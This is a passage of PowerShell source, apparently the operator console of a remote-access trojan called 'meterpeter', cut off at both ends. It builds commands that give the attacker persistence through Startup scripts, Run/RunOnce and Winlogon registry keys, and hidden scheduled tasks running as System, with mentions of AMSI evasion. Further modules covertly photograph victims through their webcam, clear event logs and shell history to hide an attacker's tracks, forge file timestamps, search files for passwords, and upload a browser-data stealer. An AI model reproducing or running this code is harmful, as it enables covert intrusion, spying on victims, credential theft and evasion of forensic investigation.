          Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
          Write-Host "   Persistence LogFile:  $logfile" -ForeGroundColor yellow;
          Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (infinite loop)." -ForeGroundColor yellow;
          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
          #$Command = Var_Obfusc(Char_Obf($Command));
          ## Writing persistence setting into beacon.log local file ..
          echo "" >> $logfile;echo "Persistence Settings" >> $logfile;
          echo "--------------------" >> $logfile;echo "DATE  : $dat" >> $logfile;
          echo "RHOST : $Remote_Host" >> $logfile;echo "LHOST : $Local_Host" >> $logfile;
          echo "LPORT : $Local_Port" >> $logfile;echo "OBFUS : $ob" >> $logfile;echo "" >> $logfile
          }
        If($startup_choise -ieq "RUNONCE" -or $startup_choise -ieq "once")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB4524147.ps1   `$env:tmp\KBPersist.vbs`n";
          $Command = "cmd /R REG ADD 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' /v KBUpdate /d '%tmp%\KBPersist.vbs' /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs";
          $Command = Var_Obfusc(Char_Obf($Command));
        }
        If($startup_choise -ieq "REGRUN" -or $startup_choise -ieq "run")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB4524147.ps1   `$env:tmp\KBPersist.vbs`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
          }
        If($startup_choise -ieq "Schtasks" -or $startup_choise -ieq "tasks")
        {
          $onjuyhg = ([char[]]([char]'A'..[char]'Z') + 0..9 | sort {get-random})[0..7] -join '';
          write-host " Make Client Beacon Home Every xx Minuts." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
          write-Host " - Input Client Remote Path: " -NoNewline;
          $execapi = Read-Host;
          write-Host " - Input Beacon Interval (minuts): " -NoNewline;
          $Interval = Read-Host;write-host "`n";
          Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
          Write-Host "   --------   ------------------";
          Write-Host "   $onjuyhg   $execapi";
          write-host "`n";
          If(-not($Interval)){$Interval = "10"}
          If(-not($execapi)){$execapi = "$env:tmp\Update-KB4524147.ps1"}
          ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }    
        If($startup_choise -ieq "WinLogon" -or $startup_choise -ieq "logon")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB4524147.ps1   `$env:tmp\KBPersist.vbs";
          Write-Host "   HIVEKEY: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
          }
        If($startup_choise -ieq "Return" -or $startup_choise -ieq "return" -or $logs_choise -ieq "cls" -or $logs_choise -ieq "Modules" -or $logs_choise -ieq "modules" -or $logs_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $startup_choise = $Null;
        }
      }
      If($choise -ieq "CamSnap" -or $choise -ieq "cam")
      {
        write-host "`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   Executing this module in UserLand (privileges) will";
        write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Device    List Camera Devices             Client:User  -  Privileges required";
        write-host "   Snap      Auto use of default cam         Client:User|Admin  - Privs required";
        write-host "   Manual    Manual sellect device cam       Client:User|Admin  - Privs required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
        $Cam_choise = Read-Host;
        If($Cam_choise -ieq "Device" -or $Cam_choise -ieq "device")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          If(([System.IO.File]::Exists("$File")))
          {
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /I /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $Upload = $True;
            $Cam_set = "True";
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
            $Command = $Null;
          }
        }
        If($Cam_choise -ieq "Snap" -or $Cam_choise -ieq "snap")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          If(([System.IO.File]::Exists("$File")))
          {
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            #$Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $Camflop = "True";
            $Upload = $True;
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
            $Command = $Null;
          }
        }
        If($Cam_choise -ieq "Manual" -or $Cam_choise -ieq "manual")
        {
          $name = "CommandCam.exe";
          $File = "$Bin$name"
          write-host " - Input Device Name to Use: " -NoNewline;
          $deviceName = Read-Host;
          If(-not($deviceName))
          {
            write-host "`n`n   [i] None Device Name enter, Aborting .." -ForegroundColor Red;Start-Sleep -Seconds 2;
          } else {
            If(([System.IO.File]::Exists("$File")))
            {
              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
              $FileBytes = "($FileBytes)";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /devname `"$deviceName`" /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";            
              $Command = $Command -replace "#","$File";
              $Command = $Command -replace "@","$FileBytes";
              $Camflop = "True";
              $Upload = $True;
            } Else {
              Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
              Write-Host "   ------   ---------";
              Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
              $Command = $Null;
            }
          }
        }
        If($Cam_choise -ieq "Return" -or $Cam_choise -ieq "return" -or $Cam_choise -ieq "cls" -or $Cam_choise -ieq "Modules" -or $Cam_choise -ieq "modules" -or $Cam_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Cam_choise = $Null;
        }
      }
      If($choise -ieq "Restart" -or $choise -ieq "restart")
      {
        ## Fast restart of Remote-Host (with msgbox)
        Write-Host " - RestartTime: " -NoNewline;
        $shutdown_time = Read-Host;
        If(-not ($shutdown_time) -or $shutdown_time -eq " ")
        {
          ## Default restart { - RestartTime: blank }
          Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
          Write-Host "   ------   --------   -------";
          Write-Host "   restart  60 (sec)   A restart is required to finish install security updates.";
          $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t 60";
        }else{
          write-host " - RestartMessage: " -NoNewline;
          $shutdown_msg = Read-Host;
          If (-not ($shutdown_msg) -or $shutdown_msg -eq " ")
          {
            ## Default msgbox { - RestartMessage: blank }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   A restart is required to finish install security updates.";
            $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t $shutdown_time";
          }else{
            ## User Inputs { - RestartTime: ++ - RestartMessage: }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   $shutdown_msg";
            $Command = "cmd /R shutdown /r /c `"$shutdown_msg`" /t $shutdown_time";
          }
        }
        $shutdown_msg = $Null;
        $shutdown_time = $Null;
      }
      If($choise -ieq "ListLog" -or $choise -ieq "log")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Check     List Remote-Host EventLogs      Client:user  - Privs required";
        write-host "   DelLogs   Del  Remote-Host EventLogs      Client:Admin - Privs required";
        write-host "   DelFull   Del  Remote-Host LogFiles       Client:Admin - Privs required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Log> " -NoNewline -ForeGroundColor Green;
        $logs_choise = Read-Host;
        If($logs_choise -ieq "Check" -or $logs_choise -ieq "check")
        {
          write-host " List Remote-Host EventLogs (Eventvwr)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "echo `"[Powershell]`" `> Event.txt;Get-EventLog -LogName `"Windows Powershell`" -newest 10 `>`> Event.txt;echo `"[Security]`" `>`> Event.txt;Get-EventLog -LogName `"Security`" -newest 10 `>`> Event.txt;echo `"[Applications]`" `>`> Event.txt;Get-EventLog -LogName `"Application`" -newest 10 `>`> Event.txt;echo `"[System]`" `>`> Event.txt;Get-EventLog -LogName `"System`" -newest 10 `>`> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
        }
        If($logs_choise -ieq "DelLogs" -or $logs_choise -ieq "dellogs")
        {
          write-host " Delete ALL Remote-Host EventLogs (from eventvwr).      " -ForegroundColor Blue -BackgroundColor White;
          write-host " This Function Will Delete All Contents of Remote-Host, " -ForegroundColor red;
          write-host " 'ConsoleHost_History.txt' file to cover attacker tracks" -ForegroundColor red;Start-Sleep -Seconds 2;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-EventLog -LogName * | ForEach { Clear-EventLog `$_.Log };echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;echo `"   [i] All EventLogs (from eventvwr) Cleared ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($logs_choise -ieq "DelFull" -or $logs_choise -ieq "delfull")
        {
          write-host " Delete ALL Remote-Host LogFiles Recursive (from disk)." -ForegroundColor Blue -BackgroundColor White;
          write-host " [warning] this Module Affects 'SearchUI' (Deletes Logs That WindowsSearch Uses)" -ForegroundColor red -BackGroundColor white;Start-Sleep -Seconds 1;
          write-host " This Function Will Delete All Contents of Remote-Host," -ForegroundColor Yellow -BackgroundColor White;
          write-host " 'ConsoleHost_History.txt' file to cover attacker tracks .." -ForegroundColor Yellow -BackgroundColor White;Start-Sleep -Seconds 2;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   [i] Cleaning LogFiles (log|tmp|Recent|Prefetch) from Disk ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /q /f %temp%\*.*;cmd /R del /q /f /s %userprofile%\*.tmp;cmd /R del /q /f /s %userprofile%\*.log;cmd /R del /q /f %windir%\Prefetch\*.*;cmd /R del /q /f %windir%\System\*.tmp;cmd /R del /q /f %windir%\System\*.log;cmd /R del /q /f %windir%\System32\*.tmp;cmd /R del /q /f %windir%\System32\*.log;cmd /R del /q /f %appdata%\Microsoft\Windows\Recent\*.*;ipconfig /flushdns;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt}else{echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($logs_choise -ieq "Return" -or $logs_choise -ieq "return" -or $logs_choise -ieq "cls" -or $logs_choise -ieq "Modules" -or $logs_choise -ieq "modules" -or $logs_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $logs_choise = $Null;
        }
        $logs_choise = $Null;
      }
      If($choise -ieq "SetMace" -or $choise -ieq "mace")
      {
        write-host " Change File Mace (date/month/year hh:mm:ss)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
        write-host " - File Absoluct Path: " -NoNewline;
        $mace_path = Read-Host;
        write-host " - Input 'day/month/year hh:mm:ss': " -NoNewline;
        $set_time = Read-Host;write-host "`n`n";
        If(-not($set_time)){$set_time = "19/12/1999 19:19:19"}
        $Command = "`$1=`"$mace_path`";If(([System.IO.File]::Exists(`"`$1`"))){Get-ChildItem $mace_path|% {`$_.creationtime = '$set_time'};Get-ChildItem $mace_path|% {`$_.lastaccesstime = '$set_time'};Get-ChildItem $mace_path|% {`$_.LastWriteTime = '$set_time'};Get-ChildItem $mace_path|Select-Object Name,LastWriteTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   File: $mace_path Not Found in Remote System`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }
      If($choise -ieq "ListPas" -or $choise -ieq "pas")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Auto      Auto search recursive           Client:user  - Privileges required";
        write-host "   Manual    Input String to Search          Client:User  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Pas> " -NoNewline -ForeGroundColor Green;
        $pass_choise = Read-Host;
        If($pass_choise -ieq "Auto" -or $pass_choise -ieq "auto")
        {
          write-host " List Stored Passwords (in Text Files)." -ForegroundColor Blue -BackgroundColor White;
          write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
          $Recursive_search = Read-Host;
          If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
          write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
          $Command = "cd $Recursive_search|findstr /S /I /C:`"user`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
        }
        If($pass_choise -ieq "Manual" -or $pass_choise -ieq "manual")
        {
          write-host " List Stored Passwords (in Text Files)." -ForegroundColor Blue -BackgroundColor White;
          write-host " - Input String to search inside files (passwrd): " -NoNewLine;
          $String_search = Read-Host;
          write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
          $Recursive_search = Read-Host;
          If(-not($String_search)){$String_search = "password"}
          If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
          write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
          $Command = "cd $Recursive_search|findstr /s /I /C:`"$String_search`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
        }
        If($pass_choise -ieq "Return" -or $pass_choise -ieq "return" -or $pass_choise -ieq "cls" -or $pass_choise -ieq "Modules" -or $pass_choise -ieq "modules" -or $pass_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $pass_choise = $Null;
        }
      }
      If($choise -ieq "ListDir" -or $choise -ieq "dir")
      {
        write-host " List Hidden directorys recursive." -ForegroundColor Blue -BackgroundColor White;
        write-host " - Directory to start search recursive (`$env:userprofile): " -NoNewLine;
        $Recursive_search = Read-Host;
        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
        $Command = "Get-ChildItem -Hidden -Path $Recursive_search -Recurse -Force -ErrorAction SilentlyContinue  >` `$env:tmp\hidden.txt;Get-Content `$env:tmp\hidden.txt|Where-Object {`$_ -notmatch '.ini'}|Set-Content `$env:tmp\out.txt;Get-Content `$env:tmp\out.txt|Where-Object {`$_ -notmatch '.dat'}|Set-Content `$env:tmp\out2.txt;Get-Content `$env:tmp\out2.txt|Where-Object {`$_ -notmatch '.tmp'}|Set-Content `$env:tmp\out3.txt;Get-Content `$env:tmp\out3.txt;Remove-Item *.txt -Force";
      }
      If($choise -ieq "GoogleX" -or $choise -ieq "googlex")
      {
        ## Start-Process -WindowStyle maximized | cmd /R start firefox
        write-host " Remote Open Firefox Google Sphere." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "cmd /R start /max microsoft-edge:https://mrdoob.com/projects/chromeexperiments/google-sphere;echo `"   [i] Opened Remote Google Sphere website ..`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
      }
      If($choise -ieq "LockPC" -or $choise -ieq "lock")
      {
        write-host " Lock Remote WorkStation." -ForegroundColor Blue -BackgroundColor White;
        write-host " [remark] This function Can also Be ABUsed To 'Silent Restart' Explorer.exe" -ForegroundColor blue -BackgroundColor white;Start-Sleep -Seconds 2;write-host "`n`n";
        $Command = "rundll32.exe user32.dll, LockWorkStation;echo `"   [i] Remote-Host WorkStation Locked ..`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
      }
      If($choise -ieq "SpeakPC" -or $choise -ieq "speak")
      {
        write-host " Make Remote-Host Speak one frase .." -ForegroundColor Blue -BackgroundColor White;
        write-host " - Input Frase for Remote-Host to Speak: " -NoNewline;
        $MYSpeak = Read-Host;
        If(-not ($MYSpeak -ieq $False -or $MYSpeak -eq ""))
        {
          write-host "`n";
          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
        }else{
          write-host "`n";
          $MYSpeak = "Next time dont forget to input the text   ok";
          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
        }
      }
      If($choise -ieq "Browser" -or $choice -ieq "browser")
      {
        write-host " Uploading files to: $Remote_Host \\ `$env:tmp" -ForegroundColor Blue -BackgroundColor White
        write-host "`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   This module will upload GetBrowsers.ps1 and mozlz4-win32.exe";
        write-host "   to target `$env:tmp trusted location, were attacker can then";
        write-host "   execute them using :meterpeter> prompt to leak browsers info.";

        $name = "GetBrowsers.ps1"
        $File = "$Bin$name"
       If(([System.IO.File]::Exists("$File")))
        {
          ## Write Local script (GetBrowsers.ps1) to Remote-Host $env:tmp
          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
          $FileBytes = "($FileBytes)";
          $File = $File.Split('\')[-1];
          $File = $File.Split('/')[-1];
          ## Write Local (mozlz4-win32.exe) to Remote-Host $env:tmp
          $name2 = "mozlz4-win32.exe";
          $File2 = "$Bin$name2"
          $FileBytes2 = [io.file]::ReadAllBytes("$File2") -join ',';
          $FileBytes2 = "($FileBytes2)";
          $File2 = $File2.Split('\')[-1];
          $File2 = $File2.Split('/')[-1];
          ## Uploading Files to remore host $env:tmp trusted location
          $Command = "`$1=`"`$env:tmp\$File`";`$2=$FileBytes;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$3=`"`$env:tmp\$File2`";`$4=$FileBytes2;If(!([System.IO.File]::Exists(`"`$3`"))){[System.IO.File]::WriteAllBytes(`"`$3`",`$4);`"`$3`"}"
          $Upload = $True;
          $Tripflop = "True";
        }else{
          ## Local File { GetBrowsers.ps1 } not found .
          Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
          Write-Host "   ------     ----------";
          Write-Host "   Not Found  $File" -ForeGroundColor red;
          $File = $Null;
